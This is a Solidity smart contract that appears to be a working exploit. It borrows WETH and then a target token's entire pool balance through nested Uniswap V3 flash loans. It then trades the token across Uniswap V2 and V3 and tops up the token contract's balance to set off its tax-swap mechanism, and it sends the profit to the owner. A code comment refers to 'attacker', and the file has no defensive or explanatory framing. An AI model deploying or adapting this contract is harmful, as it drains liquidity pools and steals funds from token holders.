// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

interface Uni_Router_V2 {

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapTokensForExactTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    
   
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

  

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to
    ) external payable returns (uint256 amountOut);

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);

   
}

interface Uni_Pair_V3 {
 function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function token0() external view returns (address);
   
}



///////////////////////////////////
contract PrimaryCT  {
   // tokenDrain tokenDrainer ; 
    address private _owner ;
   Uni_Router_V2 router_v2 = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 router_v3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
   
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V3 wethpair = Uni_Pair_V3(0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa);

   
    IERC20 private cz ;
    Uni_Pair_V3 private pair ;
    Uni_Pair_V3 private pairv2 ;

    uint256 private loanamt;
    uint256 private reswapamt;
    uint256 _taxSwapThreshold ;  /// old one  100_000_000 * 10**czdec;
     uint8 czdec ;   /// old one 9

    uint256 private thirdswapamt ; 
     

    constructor() { 
       address msgSender = msg.sender;
        _owner = msgSender;

        

  }


   function ExecuteCT(address token, address pair3, address pair2,  uint256 lamt, uint256 rpamt, uint256 taxtr, 
                uint8 tokendc, uint256 thswapamt) public {
         require(msg.sender == _owner , "Only owner can call");
        cz = IERC20(token);
        pair =  Uni_Pair_V3(pair3);
       pairv2 = Uni_Pair_V3(pair2); 

        loanamt =  lamt*1e18;
        reswapamt =  rpamt*1e18;
        _taxSwapThreshold = taxtr ; 
        czdec = tokendc;
        thirdswapamt = thswapamt ;   
       
         ////set approval for owner
         weth.approve(address(_owner), type(uint256).max);
          IERC20(cz).approve(address(_owner), type(uint256).max);

          wethpair.flash(address(this),0, loanamt, new bytes(1));

           //transfer weth to owner
        weth.transfer(address(_owner), weth.balanceOf(address(this)));
       

    }

       function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
       
        
        

        if(msg.sender == address(wethpair)){
            uint256 czv3bal = cz.balanceOf(address(pair));
           //  uint256 czv3bal = _taxSwapThreshold*2 - cz.balanceOf(address(cz)) + 10 ; 

            //pair.flash(address(this),63433590767572373,0,new bytes(1));
            if (address(cz) == pair.token0())  {
                 pair.flash(address(this),czv3bal,0,new bytes(1));
            }
            else {

                //20231122 another way round 
                pair.flash(address(this),0,czv3bal,new bytes(1));
            }
           
          
            cz.approve(address(router_v3),cz.balanceOf(address(this)));

            router_v3.exactInputSingle(Uni_Router_V3.ExactInputSingleParams({
                tokenIn : address(cz),
                tokenOut : address(weth),
                fee : 10_000,
                recipient : address(this),
                deadline : block.timestamp + 100,
                amountIn : cz.balanceOf(address(this)),
                amountOutMinimum : reswapamt ,               ///old one 30 ether
                sqrtPriceLimitX96 : 0
            }));
            
            weth.transfer(address(wethpair), loanamt + uint256(amount1));      ////old one - 30 ether
        }
        else{
            weth.approve(address(router_v2), type(uint).max);
            cz.approve(address(router_v2), type(uint).max);
            cz.approve(address(router_v3), type(uint).max);
            //first step
            address[] memory path = new address[](2);
            path[0] = address(cz);
            path[1] = address(weth);
           
            //no need this one? router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(30695631768482954,0,path,address(this),block.timestamp + 100);
             uint256 topupcz = _taxSwapThreshold - cz.balanceOf(address(cz)) + 10 ; 
           
            //uint256 firsttxncz = cz.balanceOf(address(this)) - topupcz - _taxSwapThreshold; //old one 100_000_000_000_000_000
            uint256 firsttxncz = cz.balanceOf(address(this)) - topupcz - thirdswapamt; //old one 100_000_000_000_000_000
            
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(firsttxncz,0,path,address(this),block.timestamp + 100);
           
          
            //cz.transfer(address(cz),2737958999089419);
            cz.transfer(address(cz),topupcz);

             //if attacker does not have 100M => just whatever remaining 
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(cz.balanceOf(address(this)), 0,path,address(this),block.timestamp + 100);

            path[0] = address(weth);
            path[1] = address(cz);
            
           uint256 repaycz =  (amount0 + amount1) * 101;
           
            router_v2.swapTokensForExactTokens(repaycz,weth.balanceOf(address(this)),path, address(this), block.timestamp + 100);
            cz.transfer(address(pair), cz.balanceOf(address(this)));
           
            //second step

           router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(reswapamt, 0, path, address(this), block.timestamp + 100);
          
           
        }
    }

    receive() external payable {}


}